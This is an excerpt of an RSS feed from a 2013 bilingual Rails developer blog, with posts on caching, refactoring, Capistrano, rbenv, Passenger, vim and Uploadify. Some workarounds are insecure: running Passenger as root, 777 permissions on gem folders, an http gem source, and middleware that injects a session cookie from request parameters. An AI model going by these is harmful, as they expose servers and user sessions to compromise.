&lt;p&gt;结果系统A就无法缓存。造成了系统B很大的负担。 &amp;#160; &amp;#160;( so System A has to read blank values again and again from System B )&lt;/p&gt;
&lt;p&gt;解决方案： &amp;#160;系统B在找不到对应结果时，要返回一个默认的json, 例如： (the solution is to provide default values when result not found. e.g. )&lt;/p&gt;
&lt;pre&gt;{ 
  results: [
    'I am the default value! '
  ]
}
&lt;/pre&gt;
&lt;p&gt;道理很简单，效果很明显！ &amp;#160;CPU的占用率 马上从 50% 降低到5 % 以下 ( this is very simple but very important to the system B, the CPU cost reduced from 50% to 5% )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 05 Apr 2013 08:24:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/never-return-blank-value-for-webservice</link>
    </item>
    <item>
      <title>重构 v.s. 重写  （refactor v.s. rebuild)</title>
      <description>&lt;p&gt;虽然重构这本书出现了14年，自己在重构方面也有一些实践（从07年开始），但是我发现重构在实际应用中还是需要思考一下的。 ( Although the book &amp;lt;&amp;lt;refactoring&amp;gt;&amp;gt; has been published for 14 years , and I had this kind of experience since 2007, I found that in the real world, we should think for a while before we do the refactoring. )&lt;/p&gt;
&lt;p&gt;是重构合适，还是重写合适？ &amp;#160; ( should it be refactored , or rebuilt? )&amp;#160;&lt;/p&gt;
&lt;p&gt;我的意见是，如果代码的质量很差，就不值得为其重构。差代码的特点是： ( my suggestion is: &amp;#160;let's rebuild it if it doesn't worth refactoring. &amp;#160;The bad code looks like: &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 命名很糟糕。绕来绕去的。最怕怕的例子： &amp;#160;red = 'green', &amp;#160; &amp;#160;success = 'false', &amp;#160; get_an_apple() &amp;#160; =&amp;gt; 'banana' &amp;#160; &amp;#160;( terrible naming)&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 逻辑很糟糕。大段大段的复制代码。 &amp;#160; ( terrible logic)&lt;/p&gt;
&lt;p&gt;3. 底层架构就是错的。 &amp;#160; &amp;#160;( totally incorrect infrastructure code )&amp;#160;&lt;/p&gt;
&lt;p&gt;在这样的差代码下做重构是浪费时间。一般说来，重构的步骤是： &amp;#160;( to refactor this kind of code kinda of wasting time. I would rather ask the business analyser for the re-build. &amp;#160;generally, the steps for refactoring are: )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 保证代码可以运行 &amp;#160;( make sure the targe code is running )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 读懂代码，可以写单元测试或者 回归测试 &amp;#160; ( read the code , know the logic, and write the unit tests)&amp;#160;&lt;/p&gt;
&lt;p&gt;3. 开始着手重构。 &amp;#160;写代码 ，运行测试，写代码，运行测试。。。 (start refactoring, &amp;#160; run tests, write code, run tests, write code ... )&amp;#160;&lt;/p&gt;
&lt;p&gt;我觉得让一个十年经验的程序员去读一个烂代码，从代码中分析业务逻辑，不如直接让他直接去找业务人员，了解业务需求。然后按照他自己的理解来重写。 &amp;#160;( It's not a good idea to make a ten-years experienced programmer to read the code written by a newbie with lots of terrible code with bad smells )&lt;/p&gt;
&lt;p&gt;那么，在什么时候重构合适呢？ 我觉得有三种情况： &amp;#160;( So, when should we do the refactoring? &amp;#160;I think there are 3 cases: )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 这个代码没有时间重写了。 (no time to write a new project )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 这个代码正在生产环境中使用。没法在短时间内把它停下来。或者说，一换下来，就会发生重大的生产事故，没人敢碰。 ( this code is running for production&amp;#160;purpose&amp;#160;)&lt;/p&gt;
&lt;p&gt;3. 两个人的水平相差的不太悬殊。而且底层代码的架构不是差得离谱。还有拯救的可能。( the previous coder's ability is not too bad, and the infrastructure is not so bad. &amp;#160;)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Thu, 04 Apr 2013 02:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/refactor-or-rebuild</link>
    </item>
    <item>
      <title>call bundle in capistrano + rbenv  ( capstrano + rbenv , bundle问题）</title>
      <description>&lt;p&gt;it's very easy.&lt;/p&gt;
&lt;p&gt;1. make sure you have "rbenv" and a ruby version (e.g. 1.9.3) installed in remote server&lt;/p&gt;
&lt;p&gt;2. in your config/deploy.rb (capistrano file)&amp;#160;&lt;/p&gt;
&lt;p&gt;require 'capistrano-rbenv'&lt;/p&gt;
&lt;p&gt;3. in your Gemfile:&amp;#160;&lt;/p&gt;
&lt;p&gt;gem 'capistrano-rbenv', '1.0.1'&lt;/p&gt;
&lt;p&gt;that's it. to debug if it works, just run:&amp;#160;&lt;/p&gt;
&lt;p&gt;$ cap shell&lt;/p&gt;
&lt;pre&gt;cap&amp;gt; which ruby
 ** [out :: 10.103.13.74] /root/.rbenv/shims/ruby
cap&amp;gt; ruby -v
 ** [out :: 10.103.13.74] ruby 1.9.3p327 (2012-11-10 revision 37606) [x86_64-linux]

&lt;/pre&gt;</description>
      <pubDate>Wed, 03 Apr 2013 05:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/call-bundle-in-capistrano-and-rbenv</link>
    </item>
    <item>
      <title>rbenv + passenger:  no such file to load: rubygems/path_support </title>
      <description>&lt;p&gt;refer to: &lt;a href="http://stackoverflow.com/a/15777738/445908"&gt;http://stackoverflow.com/a/15777738/445908&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;In my case, I also met this problem:  
( My environment: Centos 5.8, rbenv 1.9.3p327, passenger 3.0.19, nginx( compiled and installed by passenger) . I googled around but didn't find any direct answer ( keyword: `rbenv, passenger,  cannot load such file -- rubygems/path_support `), so I write my solution here.&lt;/p&gt;

&lt;p&gt;
I have checked and set nginx user to root, not works.
and changed all the privileges of gem folder to 777. not works.
&lt;/p&gt;
&lt;p&gt;
finally I got the solution: add these 2 lines of code to your Nginx config file: 
&lt;/p&gt;
&lt;pre&gt;    passenger_default_user root;
    passenger_default_group root;
&lt;/pre&gt;
&lt;p&gt;
so now your nginx config fie looks like:&lt;/p&gt;
&lt;pre&gt;    # /opt/nginx/config/nginx.conf
    user  root;  # seems this line of code doesn't take effect.
    http {
      passenger_root /root/.rbenv/versions/1.9.3-p327/lib/ruby/gems/1.9.1/gems/passenger-3.0.19;
      passenger_ruby /root/.rbenv/versions/1.9.3-p327/bin/ruby;

      # these lines are the key!!!
      passenger_default_user root;
      passenger_default_group root;

      server {
        listen 80;
        root &lt;your_rails_project_public_folder&gt;;
        passenger_enabled on;
      }
    }
&lt;/your_rails_project_public_folder&gt;&lt;/pre&gt;</description>
      <pubDate>Wed, 03 Apr 2013 02:28:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rbenv-passenger-no-such-file-to-load-path-support</link>
    </item>
    <item>
      <title>design pattern:  builder v.s. factory</title>
      <description>&lt;p&gt;原文见：&lt;a href="http://stackoverflow.com/questions/757743/what-is-the-difference-between-builder-design-pattern-and-factory-design-pattern"&gt;&amp;#160;http://stackoverflow.com/questions/757743/what-is-the-difference-between-builder-design-pattern-and-factory-design-pattern &lt;/a&gt; &lt;/p&gt;
&lt;p&gt;The Factory pattern can almost be seen as a simplified version of the Builder pattern.&lt;/p&gt;
&lt;p&gt;In the Factory pattern, the factory is in charge of creating various subtypes of an object depending on the needs.&lt;/p&gt;
&lt;p&gt;The user of a factory method doesn't need to know the exact subtype of that object. An example of a factory method createCar might return a Ford or a Honda typed object.&lt;/p&gt;
&lt;p&gt;In the Builder pattern, different subtypes are also created by a builder method, but the composition of the objects might differ within the same subclass.&lt;/p&gt;
&lt;p&gt;To continue the car example you might have a createCar builder method which creates a Honda-typed object with a 4 cylinder engine, or a Honda-typed object with 6 cylinders. The builder pattern allows for this finer granularity.&lt;/p&gt;
&lt;p&gt;Diagrams of both the Builder pattern and the Factory method pattern on available on Wikipedia.&lt;/p&gt;
&lt;p&gt;With design patterns, there usually is no "more advantageous" solution that works for all cases. It depends on what you need to implement.&lt;/p&gt;
&lt;p&gt;From Wikipedia:&lt;/p&gt;
&lt;p&gt;Builder focuses on constructing a complex object step by step. Abstract Factory emphasizes a family of product objects (either simple or complex). Builder returns the product as a final step, but as far as the Abstract Factory is concerned, the product gets returned immediately.&lt;br /&gt;Builder often builds a Composite.&lt;br /&gt;Often, designs start out using Factory Method (less complicated, more customizable, subclasses proliferate) and evolve toward Abstract Factory, Prototype, or Builder (more flexible, more complex) as the designer discovers where more flexibility is needed.&lt;br /&gt;Sometimes creational patterns are complementary: Builder can use one of the other patterns to implement which components get built. Abstract Factory, Builder, and Prototype can use Singleton in their implementations.&lt;/p&gt;</description>
      <pubDate>Thu, 28 Mar 2013 00:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/builder-and-factory-patterns</link>
    </item>
    <item>
      <title>rbenv的流行果然是有原因的( rbenv is much greater than RVM in some cituation)</title>
      <description>&lt;p&gt;前天晚上在一台centos 5.8上安装ruby, &amp;#160;rvm 完全不行（没有git 模块，它跟我抱怨。我手动安装了GIT后，它还是跟我抱怨。我无视抱怨，继续按照ruby 1.9.3时，出错。还是因为GIT。我了歌曲。）我用了4个小时。 结果无奈之下转向rbenv. &amp;#160;rbenv 很快搞定。（我第一次读github上的文档。。按照它的描述，15分钟搞定，没遇到任何问题）：&lt;/p&gt;
&lt;p&gt;(唯一的不足是 rbenv没能跟passenger 搭档跑RAILS。 出现 &amp;#160;cannot load such file -- rubygems/path_support 错误。等喘口气的时候再查吧）&lt;/p&gt;
&lt;p&gt;下面是安装过程的记录（见 &lt;a href="https://github.com/sstephenson/rbenv/"&gt;https://github.com/sstephenson/rbenv/ &lt;/a&gt; )&lt;/p&gt;
&lt;p&gt;  222  2013-03-26 21:30:58: git clone git://github.com/sstephenson/rbenv.git ~/.rbenv&lt;br /&gt;  223  2013-03-26 21:31:18:echo 'export PATH="$HOME/.rbenv/bin:$PATH"' &amp;gt;&amp;gt; ~/.bash_profile&lt;br /&gt;  224  2013-03-26 21:31:36: echo 'eval "$(rbenv init -)"' &amp;gt;&amp;gt; ~/.bash_profile&lt;br /&gt;  225  2013-03-26 21:31:55:exec $SHELL -l&lt;br /&gt;  226  2013-03-26 21:32:49:git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build&lt;br /&gt;  227  2013-03-26 21:33:40:rbenv install 1.9.3-p327&lt;br /&gt;  228  2013-03-26 21:50:37:rbenv rehash&lt;br /&gt;  229  2013-03-26 22:02:10:rbenv global 1.9.3-p327&lt;/p&gt;
&lt;p&gt;rubygem:&lt;br /&gt;  scp ....  rubygem 1.8.x&lt;br /&gt;  unzip ... cd ... ruby setup.rb&lt;/p&gt;
&lt;p&gt;upload shared folder...&lt;/p&gt;
&lt;p&gt;cap deploy. ...&lt;/p&gt;
&lt;p&gt;$ gem install bundler&lt;br /&gt;$ bundle&lt;/p&gt;
&lt;p&gt;yum install -y gcc ruby-devel libxml2 libxml2-devel libxslt libxslt-develyum install -y gcc ruby-devel libxml2 libxml2-devel libxslt libxslt-devel&lt;/p&gt;
&lt;p&gt;yum install mysql-devel&lt;/p&gt;</description>
      <pubDate>Wed, 27 Mar 2013 23:53:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rbenv-getting-popular</link>
    </item>
    <item>
      <title>在缓存时，空字符是个大问题 。json不要返回空啊亲! (don't response with null )</title>
      <description>&lt;p&gt;最近的一个项目中，用到了cache，结果出现了问题：&amp;#160;&lt;/p&gt;
&lt;p&gt;cache会把所有 blank? 的值认为是 无效的。 比如： nil, null , "", {} &amp;#160;&lt;/p&gt;
&lt;p&gt;这样就造成了服务器的负担很重。&lt;/p&gt;
&lt;p&gt;解决的办法很简单。比如： { results: [] } &amp;#160;就可以避免。&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 27 Mar 2013 07:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/do-not-response-with-blank</link>
    </item>
    <item>
      <title>安装 vim 及 vundle ( install vim and vundle)</title>
      <description>&lt;p&gt;使用一件称手的工具是一个工匠最快乐的事情。 ( a suitable editor is necessary for a software developer)&amp;#160;&lt;/p&gt;
&lt;p&gt;今天的一个服务器，vim 版本居然是6.3的。我服了。。。果断vim7.3啊亲 &amp;#160; ( the steps below show how to install vim and vundle )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 下载：&amp;#160;&lt;a href="ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2" title="ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2" target="_blank"&gt;ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2&lt;/a&gt;&amp;#160; （貌似国内被墙了。。。）&lt;/p&gt;
&lt;p&gt;2. 直接下载 &amp;#160; &lt;a href="http://siwei.me/system/resources/W1siZiIsIjIwMTQvMTAvMjEvMDlfNTdfMDdfODA3X2RvdF92aW1fZm9sZGVyLnppcCJdXQ/dot_vim_folder.zip"&gt;这个文件&lt;/a&gt; ,，并且解压,成为 home目录下的 .vim 即可 &amp;#160;. &amp;#160;(下面的就不用看了)&amp;#160;&lt;/p&gt;
&lt;p&gt;2. vundle:&amp;#160;&lt;/p&gt;
&lt;p&gt;$ git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle&lt;/p&gt;
&lt;p&gt;3. &lt;a href="http://siwei.me/system/resources/BAhbBlsHOgZmSSIjMjAxNC8wMS8xOS8wNV81MV8zOF82NjVfLnZpbXJjBjoGRVQ/.vimrc" target="_blank"&gt;.vimrc&lt;/a&gt; &lt;/p&gt;
&lt;pre&gt;4. Launch vim, run :BundleInstall&lt;/pre&gt;</description>
      <pubDate>Mon, 25 Mar 2013 05:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/installing-vim-and-vundle</link>
    </item>
    <item>
      <title>rails macro如何定义？where to define macros in Rails?</title>
      <description>&lt;p&gt;&lt;a href="http://stackoverflow.com/questions/926489/rails-macro-style-functions"&gt;http://stackoverflow.com/questions/926489/rails-macro-style-functions&lt;/a&gt;
&lt;/p&gt;

&lt;p&gt;如何定义rails macro?  上面的文章描述的很全面了。 对于controller使用的，就定义在application controller中。对于model会使用的，就reopen activerecord::base &lt;/p&gt;
&lt;p&gt;For models, you want to reopen ActiveRecord::Base:&lt;/p&gt;
&lt;pre&gt;module ActiveRecord
  class Base
    def self.acts_as_super_awesome
      do_more_awesome_stuff
    end
  end
end
&lt;/pre&gt;
&lt;p&gt; I personally would put that in a file in config/initializers so that it gets loaded once, and so that I know where to look for it always.&lt;/p&gt;
&lt;p&gt;Then you can access it in models like so:&lt;/p&gt;
&lt;pre&gt;class MySuperAwesomeModel &amp;lt; ActiveRecord::Base
  acts_as_super_awesome
end
&lt;/pre&gt;</description>
      <pubDate>Sun, 24 Mar 2013 02:53:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/where-to-define-macros-in-rails</link>
    </item>
    <item>
      <title>如何打印可读性强的JSON：(pretty-readable json in ruby) </title>
      <description>&lt;p&gt;&lt;a href="http://stackoverflow.com/questions/86653/how-can-i-pretty-format-my-json-output-in-ruby-on-rails" title="http://stackoverflow.com/questions/86653/how-can-i-pretty-format-my-json-output-in-ruby-on-rails" target="_blank"&gt;http://stackoverflow.com/questions/86653/how-can-i-pretty-format-my-json-output-in-ruby-on-rails&lt;/a&gt;
&lt;/p&gt;

&lt;pre&gt; 43     json = Cms::Utils.object(videoid)
 44     logger.info "== json for url( #{url}) : #{JSON.pretty_generate(json)}"
&lt;/pre&gt;</description>
      <pubDate>Sun, 24 Mar 2013 02:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/pretty-readable-json</link>
    </item>
    <item>
      <title>for chinese RVM users:  ruby.taobao.org</title>
      <description>&lt;p&gt;国内的同学门，安装 RVM之后记得走淘宝哦～ &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;安装各种rubygem也可以～～～&lt;/p&gt;
&lt;p&gt;详情见： &amp;#160;ruby.taobao.org&lt;/p&gt;
&lt;p&gt;复制过来的内容：&lt;/p&gt;
&lt;p&gt;$ gem sources --remove https://rubygems.org/&lt;br /&gt;$ gem sources -a http://ruby.taobao.org/&lt;br /&gt;$ gem sources -l&lt;br /&gt;*** CURRENT SOURCES ***&lt;/p&gt;
&lt;p&gt;http://ruby.taobao.org&lt;br /&gt;# 请确保只有 ruby.taobao.org&lt;br /&gt;$ gem install rails&lt;/p&gt;
&lt;p&gt;RVM 改用本站作为下载源, 提高 Ruby 安装速度&lt;/p&gt;
&lt;p&gt;FOR MAC&lt;br /&gt;$ sed -i .bak 's!ftp.ruby-lang.org/pub/ruby!ruby.taobao.org/mirrors/ruby!' $rvm_path/config/db&lt;br /&gt;FOR LINUX&lt;br /&gt;$ sed -i 's!ftp.ruby-lang.org/pub/ruby!ruby.taobao.org/mirrors/ruby!' $rvm_path/config/db&lt;/p&gt;</description>
      <pubDate>Thu, 21 Mar 2013 08:47:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ruby-in-taobao-for-chinese</link>
    </item>
    <item>
      <title>单元测试的几个层次 ( implementation strategies for unit tests )</title>
      <description>&lt;p&gt;1. 粗糙测试 &amp;#160; （编译通过就行， 比如，一个controller里只测一个action )&lt;/p&gt;
&lt;p&gt;2. 一般测试 &amp;#160; （测试 controller, view, model, lib ， 不测试web service )&lt;/p&gt;
&lt;p&gt;3. 精细测试 &amp;#160; &amp;#160; ( 各个分支都要测试到。。。 web service 也测试，管他mock 不mock )&lt;/p&gt;
&lt;p&gt;这个是草稿&lt;/p&gt;</description>
      <pubDate>Mon, 18 Mar 2013 00:48:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/implementation-strategies-for-unit-tests</link>
    </item>
    <item>
      <title>rails 中使用cache （最简单的) ( caching in Rails for different parameters ) </title>
      <description>&lt;a href="http://stackoverflow.com/questions/1988658/rails-action-caching-with-querystring-parameters"&gt;&amp;#160;http://stackoverflow.com/questions/1988658/rails-action-caching-with-querystring-parameters&lt;/a&gt;
&lt;p&gt; 1. in production.rb, : &lt;/p&gt;
&lt;pre&gt;config.action_controller.perform_caching = true
&lt;/pre&gt;
&lt;p&gt; 2. in your controller : (will expire in 10 munites )  &lt;/p&gt;
&lt;pre&gt;class UsersController &amp;lt; ApplicationController
   caches_action :index, :cache_path =&amp;gt; Proc.new { |c| c.params }, :expires_in =&amp;gt; 10.minutes
   def index
     render :text =&amp;gt; " name is: #{params[:name]}, time.now is: #{Time.now}"
   end
end
&lt;/pre&gt;
&lt;p&gt; 3. stop &amp;amp; start your Rails server completely, and check your logs : &amp;#160;( focus on the "Read fragment / Write fragment " .)&amp;#160;&lt;/p&gt;
&lt;pre&gt;14:29:37 INFO: Started GET "/users?name=raynor" for 127.0.0.1 at 2013-03-17 14:29:37 +0800 
14:29:37 INFO: Processing by UsersController#index as HTML 
14:29:37 INFO:   Parameters: {"name"=&amp;gt;"raynor"} 
14:29:37 INFO: Read fragment views/localhost:337/users?name=raynor (0.1ms) 
14:29:37 INFO:   Rendered text template (0.0ms) 
14:29:37 INFO: Write fragment views/localhost:337/users?name=raynor (2.5ms) 
14:29:37 INFO: Completed 200 OK in 6ms (Views: 0.7ms | ActiveRecord: 0.0ms) 
14:29:40 INFO:  
14:29:40 INFO:  
14:29:40 INFO: Started GET "/users?name=raynor" for 127.0.0.1 at 2013-03-17 14:29:40 +0800 
14:29:40 INFO: Processing by UsersController#index as HTML 
14:29:40 INFO:   Parameters: {"name"=&amp;gt;"raynor"} 
14:29:40 INFO: Read fragment views/localhost:337/users?name=raynor (0.2ms) 
14:29:40 INFO: Completed 200 OK in 2ms (ActiveRecord: 0.0ms) 
&lt;/pre&gt;
&lt;p&gt;你也可以使用 mem_cache， （这样的话就不要设置 &amp;#160;:size option, &amp;#160;）&lt;/p&gt;
&lt;pre&gt;# in your Gemfile
 gem 'memcache-client', '1.8.5'  

# in your production.rb
config.cache_store = :mem_cache_store, '10.103.13.96:11311', '10.103.13.97:11314'
&lt;/pre&gt;
</description>
      <pubDate>Sun, 17 Mar 2013 06:24:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rails-action-caching-with-querystring-parameters</link>
    </item>
    <item>
      <title>Rails中使用uploadify 插件 ( using Uploadify in Rails3)</title>
      <description>&lt;p&gt;这个插件非常好用。 可以看作是 SWFupload的后续 （SWFUPLOAD已经停止开发好久好久了）&lt;/p&gt;
&lt;p&gt;使用步骤也是一般吧，不是一下就可以搞定（我昨天花了大半天时间才做了个满意的封装，虽然我很讨厌封装），但是也不是特别麻烦。可以说解藕做的不错～ &amp;#160;&lt;/p&gt;
&lt;p&gt;实现它的缘由&lt;br /&gt;1. 由于我们的图片都保存在一个远程服务器上，所以我们不需要在本地永久保存上传的数据。 对应的数据库中的列也只是一个String类型（varchar(255))，所以，我们只需要获取远程（CDN 服务器）上的IMAGE URL就好了。&lt;/p&gt;
&lt;p&gt;2. 由于上传的限制很多（光服务器返回的错误代码就6种以上），所以，把这些出错消息返回给ERB页面很麻烦。所以我的想法就是做成GMAIL上传附件那样。可以即时的返回消息（AJAX方式）。这样用户就知道出错的原因 和解决办法了（原来出错的话没有任何消息）&lt;/p&gt;
&lt;p&gt;3. 原有项目中的upload代码 出现很多次，重复的代码太多。这样会导致项目的难以维护。代码越是简洁，维护起来就越方便。开发速度也就越快。&lt;/p&gt;
&lt;p&gt;4. 所以，我的方式是： AJAX 图片上传，本地表单项呢，是一个&amp;lt;input text&amp;gt;, 而不是&amp;lt;input file&amp;gt;。这样的话。上传图片后，这个&amp;lt;input text&amp;gt;就有了值，然后表单提交后，controller 用正常的方式 update_attribute(params[:entity]) 就直接把 params[:entity][:image_url]给更新了（假定属性叫 image_url)。 可以说， controller的代码一行都不用变。&lt;/p&gt;
&lt;p&gt;5. 保证系统中有一个专门的action 处理AJAX上传。例如： /commons/upload (POST)&lt;/p&gt;
&lt;p&gt;步骤如下：（参考它的官方DEMO），以及session的问题： 这个是for Rails2.3 的！！！(http://www.railstips.org/blog/archives/2009/07/21/uploadify-and-rails23/ &amp;#160;)&lt;/p&gt;
&lt;p&gt;（也不好使。。。不过我根据它的修修改改弄好了）这个是session for Rails3的：&lt;a href="http://www.damiangalarza.com/posts/ruby-on-rails/using-uploadify-with-rails-3/"&gt; http://www.damiangalarza.com/posts/ruby-on-rails/using-uploadify-with-rails-3/ &lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;session 问题的关键是：&lt;/p&gt;
&lt;p&gt;1. env['HTTP_COOKIE'] 要对的上。&lt;/p&gt;
&lt;p&gt;2. authentication_token 要传给Rails.&amp;#160;&lt;/p&gt;
&lt;p&gt;如果Rails3 发现以上2个条件，任意一个不对，它都会关闭当前的session, 然后分配给你一个新的session.&amp;#160;&lt;/p&gt;
&lt;p&gt;下面是我的具体步骤：&amp;#160;&lt;/p&gt;
&lt;p&gt;1. config/environment.rb:&lt;/p&gt;
&lt;pre&gt; config.autoload_paths += %W(#{config.root}/app/middleware)
&lt;/pre&gt;
&lt;p&gt;2. app/middleware/flash_session_cookie_middleware.rb&amp;#160;&lt;/p&gt;
&lt;p&gt;( 注意！！！session_key 应该是你的APP的！）&lt;/p&gt;
&lt;p&gt;( 注意！！！ 下面的 &amp;#160;env["REQUEST_URI"] == "/commons/upload" 一行，根据你的需要进行修改！～)&lt;/p&gt;
&lt;pre&gt;require 'rack/utils'

class FlashSessionCookieMiddleware
  def initialize(app, session_key = '_cms_session') # !!! change it to your own! 
    @app = app 
    @session_key = session_key
  end 

  def call(env)
    if env["REQUEST_URI"] == "/commons/upload" # env['HTTP_USER_AGENT'] =~ /^(Adobe|Shockwave) Flash/
      Rails.logger.debug "===== (before frozen) env['HTTP_COOKIE']: #{env['HTTP_COOKIE'].inspect}"
      req = Rack::Request.new(env)
      unless req.params[@session_key].nil?
        env['HTTP_COOKIE'] = [ @session_key, req.params[@session_key] ].join('=').freeze
      end 
      Rails.logger.debug "===== (after frozen) env['HTTP_COOKIE']: #{env['HTTP_COOKIE'].inspect}"
    end 

    @app.call(env)
  end 
end
end
&lt;/pre&gt;

&lt;p&gt; 3.config/initializers/session_store.rb,  add these lines of code:  &lt;/p&gt;
&lt;pre&gt; Rails.application.config.middleware.insert_before(
   ActionDispatch::Session::CookieStore,
   FlashSessionCookieMiddleware,
   Rails.application.config.session_options[:key]
 )   
                                                  
&lt;/pre&gt;
&lt;p&gt; 4. in your ERB file (where the uploadify affects ) &lt;/p&gt;
&lt;pre&gt;&amp;lt;% session_key = Rails.application.config.session_options[:key] %&amp;gt;
&amp;lt;script&amp;gt;
...
  data['&amp;lt;%= session_key %&amp;gt;'] = '&amp;lt;%= cookies[session_key] %&amp;gt;'
  data['authenticity_token'] = '&amp;lt;%= form_authenticity_token %&amp;gt;'
  ......
  'formData' : data,
  ......
&lt;/pre&gt;</description>
      <pubDate>Sun, 17 Mar 2013 01:21:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/uploadify-in-rails</link>
    </item>
    <item>
      <title>测试文件上传 (test file upload in Rails ) </title>
      <description>&lt;p&gt;非常简单。
You can use &lt;a href="http://apidock.com/rails/v3.2.8/ActionDispatch/TestProcess/fixture_file_upload"&gt; fixture_file_upload &lt;/a&gt; method to test file uploading: Put your test file in "{Rails.root}/spec/fixtures/files" directory
&lt;/p&gt;
&lt;pre&gt;before :each do
  @file = fixture_file_upload('files/test_lic.xml', 'text/xml')
end

it "can upload a license" do
  post :uploadLicense, :upload =&amp;gt; @file
  response.should be_success
end
&lt;/pre&gt;
&lt;p&gt;记得第二个参数是 mime类型， 比如 &amp;#160;'image/png', 'image/jpeg' 啥的。 &amp;#160;( the second parameter is the MIME type)&lt;/p&gt;</description>
      <pubDate>Sat, 16 Mar 2013 06:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/testing-file-upload-in-rails</link>
    </item>
    <item>
      <title>capistrano 中的logger, set-before (capistrano basic usages)</title>
      <description>&lt;p&gt;Capistrano 灰常好用。 不过有几个常用的用法还是要留意一下：&amp;#160;参考这个文章： &lt;/p&gt;
&lt;p&gt;http://stackoverflow.com/questions/4294970/rails-3-capistrano-tutorial-to-deploy-to-server-using-git &lt;/p&gt;
&lt;p&gt;http://www.aaginskiy.com/technology/2011/02/deploying-rails-3-apps-with-capistrano/&lt;/p&gt;
&lt;p&gt;1. vim Gemfile, 增加：&lt;/p&gt;
&lt;p&gt;gem 'capistrano' &lt;/p&gt;
&lt;p&gt;2. $ bundle install &lt;/p&gt;
&lt;p&gt;3. $ capify . &lt;br /&gt;会生成两个文件： Capfile ,  config/deploy.rb &lt;/p&gt;
&lt;p&gt;4. 编辑后者，然后 $ cap deploy. &lt;/p&gt;
&lt;p&gt;5. $ cap deploy:setup 会建立必须的 文件夹 &lt;/p&gt;
&lt;p&gt;6. 编辑 $ shared/config/database.yml &lt;/p&gt;
&lt;p&gt;这里是一个完整的deploy.rb ： &lt;/p&gt;
&lt;p&gt;https://github.com/beijing-rubyist/bjrubyist/blob/master/config/deploy.rb &lt;/p&gt;
&lt;p&gt;使用 输入： &amp;#160;set(:user) { Capistrano::CLI.ui.ask("User name: ") }&lt;/p&gt;

&lt;p&gt;1. 总览：  &lt;br /&gt;$ cap --help&lt;/p&gt;
&lt;p&gt;2. 使用logger，特别是在其他语言调用CAP时，非常有用（例如被fabric 调用）:&amp;#160;&lt;br /&gt;$ cap setup --logger STDOUT&lt;/p&gt;
&lt;p&gt;3. 使用变量， 要记得:  使用@. . 例如，我们要设置 "deploy_type" 这个变量：&amp;#160;&lt;br /&gt;$ cap say_hi --set-before deploy_type=staging&lt;/p&gt;
&lt;p&gt;然后在 config/deploy.rb 中这样使用：&lt;/p&gt;
&lt;p&gt;DEFAULT_TYPE = "stable"&amp;#160;&lt;br /&gt;  &lt;br /&gt;# deploy_type 仅仅在 begin 这个区域中生效, 在rescue, ensure中都不行。  &lt;br /&gt;begin  &lt;br /&gt;  deploy_type  &lt;br /&gt;  puts "deploy_type was set successfully"  &lt;br /&gt;  @deploy_type = deploy_type  &lt;br /&gt;rescue Exception =&amp;gt; e  &lt;br /&gt;  puts "deploy_type not set, use default: #{DEFAULT_TYPE}"  &lt;br /&gt;  deploy_type = DEFAULT_TYPE  &lt;br /&gt;  @deploy_type = deploy_type  &lt;br /&gt;end  &lt;br /&gt;  &lt;br /&gt;task :say_hi do  &lt;br /&gt;  puts "hihihi, var_deploy_type: #{@deploy_type}"  &lt;br /&gt;end  &lt;/p&gt;
&lt;p&gt;输出：&amp;#160;&lt;br /&gt;deploy_type was set successfully&amp;#160;&lt;br /&gt;============= DEPLOY_PATH: /rails_apps/babble_portal/cutting_edge  &lt;br /&gt;  * executing `say_hi'  &lt;br /&gt;hihihi, var_deploy_type: 444  &lt;/p&gt;
&lt;p&gt;最后，使用copy方式：&lt;/p&gt;
&lt;pre&gt;set :scm, :none
set :repository, "."
set :deploy_via, :copy
&lt;/pre&gt;

</description>
      <pubDate>Fri, 15 Mar 2013 07:20:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/capistrano-basics</link>
    </item>
    <item>
      <title>流行的工具都是有道理的（ best practices are best in most cases)</title>
      <description>&lt;p&gt;1. 版本控制： SVN =&amp;gt; &amp;#160;GIT &amp;#160; &amp;#160; &amp;#160; ( scm : &amp;#160;from SVN to GIT)&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 部署方式： 人肉部署 =&amp;gt; Capistrano &amp;#160;&lt;/p&gt;
&lt;p&gt;原来项目中用到的是SVN， 就一个分支，也不打TAG。感觉用起来没啥。 &amp;#160;( there's not so much trouble when the project is going under SVN and manual deployment)&lt;/p&gt;
